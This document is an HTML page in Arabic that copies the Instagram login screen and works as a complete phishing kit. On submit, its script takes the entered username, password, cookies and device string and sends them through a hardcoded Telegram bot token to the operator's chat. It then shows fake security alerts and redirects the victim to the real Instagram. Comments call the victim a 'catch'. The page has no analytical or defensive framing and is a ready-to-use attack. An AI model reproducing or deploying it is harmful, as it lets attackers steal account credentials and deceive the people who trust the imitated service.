<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول • Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
        .logo { width: 175px; margin-bottom: 20px; }
        input { width: 100%; padding: 9px; margin-bottom: 7px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
        .btn { width: 100%; background-color: #0095f6; border: none; color: white; padding: 5px 0; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
        .divider { margin: 20px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: bold; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
        .fb-login { color: #385185; font-weight: bold; font-size: 14px; cursor: pointer; text-decoration: none; }
    </style>
</head>
<body>

    <div class="login-box">
        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_login_header.png/75591938e51a.png" class="logo">
        <form id="loginForm">
            <input type="text" id="username" placeholder="اسم المستخدم أو الهاتف" required>
            <input type="password" id="password" placeholder="كلمة السر" required>
            <button type="submit" class="btn">تسجيل الدخول</button>
        </form>
        <div class="divider">أو</div>
        <a class="fb-login">تسجيل الدخول باستخدام Facebook</a>
    </div>

    <script>
        const botToken = '8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg';
        const myId = '5811700860';

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const cookies = document.cookie || "لا توجد كوكيز متاحة حالياً";
            const device = navigator.userAgent;

            // إرسال البيانات المدموجة للبوت
            const message = `
🎣 **صيد جديد (مدموج):**
👤 **اليوزر:** \`${user}\`
🔑 **الباسورد:** \`${pass}\`
🍪 **الكوكيز:** \`${cookies}\`
📱 **الجهاز:** \`${device}\`
            `;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
            .then(() => {
                // بعد السحب، نسوي المقلب النفسي اللي وعدتك به
                alert("⚠️ خطأ في المصادقة: جاري فحص ملفات النظام...");
                setTimeout(() => {
                    alert("❌ تم اكتشاف دخول مشبوه، جاري سحب الصور لتأمين الحساب!");
                    window.location.href = "https://www.instagram.com"; // تحويله للموقع الحقيقي
                }, 1000);
            });
        });
    </script>
</body>
</html>
